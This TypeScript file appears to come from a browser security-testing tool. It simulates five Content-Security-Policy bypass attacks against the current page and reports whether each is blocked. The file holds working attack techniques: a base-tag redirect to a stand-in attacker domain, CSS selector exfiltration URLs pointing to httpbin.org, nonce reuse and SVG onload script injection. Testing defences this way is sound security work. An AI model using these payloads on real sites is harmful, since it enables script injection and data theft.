import type { AttackResult, AttackTest } from "../types.js";

/**
 * Meta CSP Override
 * <meta http-equiv="Content-Security-Policy"> を注入して既存CSPを緩和し、
 * インラインスクリプトが実行可能かテストする。
 * ブラウザは meta CSP でサーバー送信CSPを緩和できないが、
 * CSPヘッダーが存在しない場合は meta CSP が唯一のポリシーとなる。
 */
async function simulateMetaCspOverride(): Promise<AttackResult> {
  const startTime = performance.now();
  let inlineExecuted = false;
  let errorMessage: string | null = null;

  // 既存の meta CSP を記録（復元用）
  const existingMeta = document.querySelector(
    'meta[http-equiv="Content-Security-Policy"]'
  );
  const existingMetaClone = existingMeta
    ? (existingMeta.cloneNode(true) as HTMLMetaElement)
    : null;

  const meta = document.createElement("meta");
  const testScript = document.createElement("script");

  try {
    if (existingMeta) {
      existingMeta.remove();
    }

    // 緩和的な CSP meta を注入
    meta.httpEquiv = "Content-Security-Policy";
    meta.content = "default-src * 'unsafe-inline' 'unsafe-eval' data: blob:";
    document.head.appendChild(meta);

    // インラインスクリプトが実行できるかテスト
    testScript.textContent =
      "window.__battacker_csp_bypass_test__ = true;";
    document.head.appendChild(testScript);

    inlineExecuted =
      (window as any).__battacker_csp_bypass_test__ === true;
  } catch (error) {
    errorMessage =
      error instanceof Error ? error.message : String(error);
  } finally {
    delete (window as any).__battacker_csp_bypass_test__;
    if (testScript.parentNode) {
      testScript.remove();
    }
    if (meta.parentNode) {
      meta.remove();
    }
    if (existingMetaClone) {
      document.head.appendChild(existingMetaClone);
    }
  }

  const executionTime = performance.now() - startTime;

  if (errorMessage) {
    return {
      blocked: true,
      executionTime,
      details: `Meta CSP override blocked: ${errorMessage}`,
      error: errorMessage,
    };
  }

  if (inlineExecuted) {
    return {
      blocked: false,
      executionTime,
      details:
        "Meta CSP override successful - inline script executed despite CSP (policy weakened via <meta>)",
    };
  }

  // meta 注入自体は成功したが、インラインスクリプトはブロックされた
  // → サーバーCSPが meta より優先された（正しい挙動）
  return {
    blocked: true,
    executionTime,
    details:
      "Meta CSP injection attempted but inline script was blocked (server CSP takes precedence)",
  };
}

/**
 * Base Tag Hijack
 * <base href> を注入して相対URLを攻撃者ドメインにリダイレクトする。
 * CSP の base-uri ディレクティブが適切に設定されていなければ成功する。
 */
async function simulateBaseTagHijack(): Promise<AttackResult> {
  const startTime = performance.now();
  let resolvedUrl = "";
  let errorMessage: string | null = null;
  let existingBase: HTMLBaseElement | null = null;
  let originalHref: string | undefined;
  let maliciousBase: HTMLBaseElement | null = null;

  try {
    // 既存の base タグを保存
    existingBase = document.querySelector("base");
    originalHref = existingBase?.href;

    // 攻撃者の base タグを注入
    maliciousBase = document.createElement("base");
    maliciousBase.href = "https://evil.attacker.example.com/";
    document.head.insertBefore(
      maliciousBase,
      document.head.firstChild
    );

    // 相対 URL を持つアンカーを作成して解決先を確認
    const testAnchor = document.createElement("a");
    testAnchor.href = "login"; // 相対 URL
    resolvedUrl = testAnchor.href;
  } catch (error) {
    errorMessage =
      error instanceof Error ? error.message : String(error);
  } finally {
    if (maliciousBase?.parentNode) {
      document.head.removeChild(maliciousBase);
    }
    if (existingBase && originalHref && existingBase.href !== originalHref) {
      existingBase.href = originalHref;
    }
  }

  const executionTime = performance.now() - startTime;

  if (errorMessage) {
    return {
      blocked: true,
      executionTime,
      details: `Base tag hijack blocked: ${errorMessage || "unknown error"}`,
      error: errorMessage || "unknown error",
    };
  }

  let resolvedHost = "";
  try {
    resolvedHost = new URL(resolvedUrl).hostname;
  } catch {
    resolvedHost = "";
  }

  if (resolvedHost === "evil.attacker.example.com") {
    return {
      blocked: false,
      executionTime,
      details: `Base tag hijack successful - relative URLs redirected to attacker domain (resolved: ${resolvedUrl})`,
    };
  }

  // base-uri CSP が機能している場合
  if (originalHref && resolvedUrl.startsWith(originalHref)) {
    return {
      blocked: true,
      executionTime,
      details:
        "Base tag hijack blocked - original base URL preserved (base-uri CSP enforced)",
    };
  }

  return {
    blocked: true,
    executionTime,
    details: `Base tag injection did not redirect URLs (resolved: ${resolvedUrl})`,
  };
}

/**
 * CSS Data Exfiltration
 * CSS の属性セレクタと background-image url() を利用して、
 * スクリプト実行なしにフォーム入力値などを外部に送信する。
 * style-src が適切に制限されていなければ成功する。
 */
async function simulateCssDataExfil(): Promise<AttackResult> {
  const startTime = performance.now();
  let errorMessage: string | null = null;

  try {
    // テスト用 input を作成
    const input = document.createElement("input");
    input.type = "hidden";
    input.id = "battacker-css-exfil-test";
    input.value = "secret-token-abc123";
    input.style.position = "absolute";
    input.style.left = "-9999px";
    document.body.appendChild(input);

    // CSS属性セレクタで値を検出するスタイルを注入
    const style = document.createElement("style");
    style.textContent = `
      #battacker-css-exfil-test[value^="s"] {
        background-image: url("https://httpbin.org/get?leak=s");
      }
      #battacker-css-exfil-test[value^="se"] {
        background-image: url("https://httpbin.org/get?leak=se");
      }
      #battacker-css-exfil-test[value^="sec"] {
        background-image: url("https://httpbin.org/get?leak=sec");
      }
    `;

    let styleApplied = false;
    try {
      document.head.appendChild(style);
      styleApplied = true;
    } catch {
      styleApplied = false;
    }

    // スタイルが適用されたか確認
    const computedStyle = window.getComputedStyle(input);
    const bgImage = computedStyle.backgroundImage;
    let hasExfilUrl = false;
    if (bgImage !== "none") {
      const match = /url\(["']?([^"')]+)["']?\)/.exec(bgImage);
      const extractedUrl = match?.[1] ?? "";
      try {
        hasExfilUrl = new URL(extractedUrl).hostname === "httpbin.org";
      } catch {
        hasExfilUrl = false;
      }
    }

    // クリーンアップ
    document.body.removeChild(input);
    if (styleApplied) {
      document.head.removeChild(style);
    }

    const executionTime = performance.now() - startTime;

    if (!styleApplied) {
      return {
        blocked: true,
        executionTime,
        details:
          "CSS data exfiltration blocked - style injection prevented by CSP style-src",
      };
    }

    if (hasExfilUrl) {
      return {
        blocked: false,
        executionTime,
        details:
          "CSS data exfiltration successful - attribute selector with external URL applied (script-free data leak)",
      };
    }

    // スタイルは注入できたがリクエストは送信されなかった
    return {
      blocked: true,
      partial: true,
      leakConfirmed: false,
      executionTime,
      details:
        "CSS style injection succeeded but data exfiltration blocked - external URL request prevented by CSP img-src/default-src",
    };
  } catch (error) {
    errorMessage =
      error instanceof Error ? error.message : String(error);
    return {
      blocked: true,
      executionTime: performance.now() - startTime,
      details: `CSS data exfiltration blocked: ${errorMessage}`,
      error: errorMessage,
    };
  }
}

/**
 * Script Nonce Reuse
 * ページ内の既存スクリプトタグからCSP nonce値を抽出し、
 * 新しいスクリプトタグに再利用して実行を試みる。
 */
async function simulateNonceReuse(): Promise<AttackResult> {
  const startTime = performance.now();

  try {
    // ページ内の既存スクリプトから nonce を抽出
    const scripts = Array.from(
      document.querySelectorAll("script[nonce]")
    );
    const nonces: string[] = [];

    for (const script of scripts) {
      const nonce =
        script.getAttribute("nonce") ||
        (script as HTMLScriptElement).nonce;
      if (nonce) {
        nonces.push(nonce);
      }
    }

    if (nonces.length === 0) {
      return {
        blocked: true,
        executionTime: performance.now() - startTime,
        details:
          "No CSP nonces found on page (nonce-based CSP not in use or nonces hidden)",
      };
    }

    // 抽出した nonce を使って新しいスクリプトを実行
    let executionSucceeded = false;
    const reusedNonce = nonces[0];

    const testScript = document.createElement("script");
    testScript.setAttribute("nonce", reusedNonce);
    testScript.textContent =
      "window.__battacker_nonce_reuse_test__ = true;";
    document.head.appendChild(testScript);

    executionSucceeded =
      (window as any).__battacker_nonce_reuse_test__ === true;

    // クリーンアップ
    delete (window as any).__battacker_nonce_reuse_test__;
    document.head.removeChild(testScript);

    const executionTime = performance.now() - startTime;

    if (executionSucceeded) {
      return {
        blocked: false,
        executionTime,
        details: `Script nonce reuse successful - extracted nonce "${reusedNonce.slice(0, 8)}..." allowed new script execution`,
      };
    }

    return {
      blocked: true,
      executionTime,
      details: `Nonce reuse blocked - found ${nonces.length} nonce(s) but reused nonce was rejected`,
    };
  } catch (error) {
    const errorMessage =
      error instanceof Error ? error.message : String(error);
    return {
      blocked: true,
      executionTime: performance.now() - startTime,
      details: `Script nonce reuse blocked: ${errorMessage}`,
      error: errorMessage,
    };
  }
}

/**
 * SVG Script Injection
 * SVGの <script> や onload イベントを利用してCSPのスクリプト制限を回避する。
 * DOMParser や innerHTML 経由で SVG を注入し、内部スクリプトが実行されるかテスト。
 */
async function simulateSvgScriptInjection(): Promise<AttackResult> {
  const startTime = performance.now();

  try {
    let scriptExecuted = false;

    // 方法1: innerHTML 経由の SVG スクリプト注入
    const container = document.createElement("div");
    container.id = "battacker-svg-test";
    container.style.display = "none";
    document.body.appendChild(container);

    const svgPayload = `<svg xmlns="http://www.w3.org/2000/svg" onload="window.__battacker_svg_test__=true"><rect width="1" height="1"/></svg>`;
    // 意図的な XSS テスト: innerHTML 経由での SVG スクリプト注入を検証
    // eslint-disable-next-line no-unsanitized/property
    container.innerHTML = svgPayload;

    // onload が実行されたか確認
    if ((window as any).__battacker_svg_test__ === true) {
      scriptExecuted = true;
    }

    // 方法2: DOMParser 経由
    if (!scriptExecuted) {
      const parser = new DOMParser();
      const svgWithScript = `<svg xmlns="http://www.w3.org/2000/svg"><script>window.__battacker_svg_test__=true;</script></svg>`;
      const svgDoc = parser.parseFromString(
        svgWithScript,
        "image/svg+xml"
      );
      const svgElement = svgDoc.documentElement;

      // パース結果の SVG を DOM に挿入
      const importedSvg = document.importNode(svgElement, true);
      container.appendChild(importedSvg);

      if ((window as any).__battacker_svg_test__ === true) {
        scriptExecuted = true;
      }
    }

    // クリーンアップ
    delete (window as any).__battacker_svg_test__;
    document.body.removeChild(container);

    const executionTime = performance.now() - startTime;

    if (scriptExecuted) {
      return {
        blocked: false,
        executionTime,
        details:
          "SVG script injection successful - script executed within SVG context (CSP script-src bypass)",
      };
    }

    return {
      blocked: true,
      executionTime,
      details:
        "SVG script injection blocked - inline scripts within SVG were prevented",
    };
  } catch (error) {
    const errorMessage =
      error instanceof Error ? error.message : String(error);
    return {
      blocked: true,
      executionTime: performance.now() - startTime,
      details: `SVG script injection blocked: ${errorMessage}`,
      error: errorMessage,
    };
  }
}

export const cspBypassAttacks: AttackTest[] = [
  {
    id: "injection-meta-csp-override",
    name: "Meta CSP Override",
    category: "injection",
    description:
      "Injects <meta> tag to weaken Content-Security-Policy and enable inline script execution",
    severity: "critical",
    simulate: simulateMetaCspOverride,
  },
  {
    id: "injection-base-tag-hijack",
    name: "Base Tag Hijack",
    category: "injection",
    description:
      "Injects <base href> to redirect all relative URLs to attacker-controlled domain",
    severity: "critical",
    simulate: simulateBaseTagHijack,
  },
  {
    id: "injection-css-data-exfil",
    name: "CSS Data Exfiltration",
    category: "injection",
    description:
      "Uses CSS attribute selectors with external URLs to exfiltrate form data without JavaScript",
    severity: "high",
    simulate: simulateCssDataExfil,
  },
  {
    id: "injection-nonce-reuse",
    name: "Script Nonce Reuse",
    category: "injection",
    description:
      "Extracts CSP nonce from existing script tags and reuses it to execute arbitrary scripts",
    severity: "high",
    simulate: simulateNonceReuse,
  },
  {
    id: "injection-svg-script",
    name: "SVG Script Injection",
    category: "injection",
    description:
      "Injects SVG elements with embedded scripts/event handlers to bypass CSP script-src restrictions",
    severity: "high",
    simulate: simulateSvgScriptInjection,
  },
];
